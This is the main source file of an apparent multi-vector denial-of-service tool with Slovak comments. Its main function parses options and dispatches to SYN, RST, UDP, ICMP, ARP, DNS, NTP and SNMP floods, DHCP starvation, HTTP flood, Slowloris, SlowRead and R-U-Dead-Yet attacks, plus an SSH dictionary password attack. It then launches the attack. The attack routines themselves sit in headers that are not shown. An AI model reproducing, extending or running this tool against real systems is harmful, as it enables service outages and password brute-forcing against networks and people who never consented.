#include <stdio.h>
#include <getopt.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

#include "libdos.h"
#include "slowloris.h"
#include "httpFlood.h"
#include "slowRead.h"
#include "sshPass.h"
#include "rudy.h"
#include "argsParse.h"


int main(int argc, char **argv)
{

	if (argc < 2)
		print_help_and_die();


	int argc_orig = argc;
	int i = 0;
	while (1)
	{
		if (i >= argc)
		{
			break;
		}
		else if (strncmp(argv[i], "--", 2) == 0)
		{
			break;
		}
		i++;
	}
	argc = i;

	// long unsigned pps = 0;
	int proc_num = 0;
	char *dev = NULL;

	int c;
	opterr = 0;
	while ((c = getopt(argc, argv, "i:P:h")) != -1) // b:
	{
		switch (c)
		{
		case 'i':
			dev = optarg;
			break;
		case 'P':
			proc_num = atoi(optarg);
			break;
		case 'h':
			print_help_and_die();
			break;
		default:
			print_help_and_die();
		}
	}

	// Formátovanie
	char proc_num_str[10];
	sprintf(proc_num_str, "%u", proc_num);

	// Vymazanie dočasného súboru
	remove("tmp.cfg");

	argc = argc_orig;
	argv++;
	argc--;

	int flood_type_index = 0;
	int flood_argc = 0;
	while (find_flood(argc, argv, &flood_type_index, &flood_argc))
	{
		optind = 0;
		opterr = 0;
		optopt = 0;

		char *flood_type = argv[flood_type_index];
		char **flood_argv = argv + flood_type_index;

		// SYN flood
		if (strcmp(flood_type, "--syn") == 0)
		{
			syn_flood(flood_argc + 1, flood_argv);
		}
		// RST flood
		else if (strcmp(flood_type, "--rst") == 0)
		{
			rst_flood(flood_argc + 1, flood_argv);
		}
		// UDP flood
		else if (strcmp(flood_type, "--udp") == 0)
		{
			udp_flood(flood_argc + 1, flood_argv);
		}
		// ICMP flood
		else if (strcmp(flood_type, "--icmp") == 0)
		{
			icmp_flood(flood_argc + 1, flood_argv);
		}
		// ARP flood
		else if (strcmp(flood_type, "--arp") == 0)
		{
			arp_flood(flood_argc + 1, flood_argv);
		}
		// DNS flood
		else if (strcmp(flood_type, "--dns") == 0)
		{
			dns_flood(flood_argc + 1, flood_argv);
		}
		// DHCP starvation
		else if (strcmp(flood_type, "--dhcp") == 0)
		{
			dhcp_flood(flood_argc + 1, flood_argv);
		}
		// HTTP flood
		else if (strcmp(flood_type, "--http") == 0)
		{
			//httpFlood(flood_argc + 1, flood_argv);
                        httpFlood attack(flood_argc + 1, flood_argv);
			attack.run();
		}
		// SlowRead
		else if (strcmp(flood_type, "--slowRead") == 0)
		{
			SlowRead attack(flood_argc + 1, flood_argv);
			attack.run();
		}
		// Slowloris
		else if (strcmp(flood_type, "--slowLoris") == 0)
		{
			SlowLoris attack(flood_argc + 1, flood_argv);
			attack.run();
		}
		// R-U-Dead Yet?
		else if (strcmp(flood_type, "--rudy") == 0)
		{
			Rudy attack(flood_argc + 1, flood_argv);
			attack.run();
		}
		// SSH dictionary password attack
		else if (strcmp(flood_type, "--ssh") == 0)
		{
			sshPass(flood_argc + 1, flood_argv);
		}
        // NTP Flood
        else if (strcmp(flood_type, "--ntp") == 0)
        {
            ntp_flood(flood_argc + 1, flood_argv);
        }
        // SNMP flood
		else if (strcmp(flood_type, "--snmp") == 0)
		{
			snmp_flood(flood_argc + 1, flood_argv);
		}
		else
		{
			print_help_and_die();
		}

		if (flood_argc > 0)
		{
			flood_type_index += flood_argc;
		}
		else
		{
			flood_type_index += 1;
		}
	}//*/

	// Zahájenie útoku
	start_attack(dev, proc_num_str); //pps_str
}



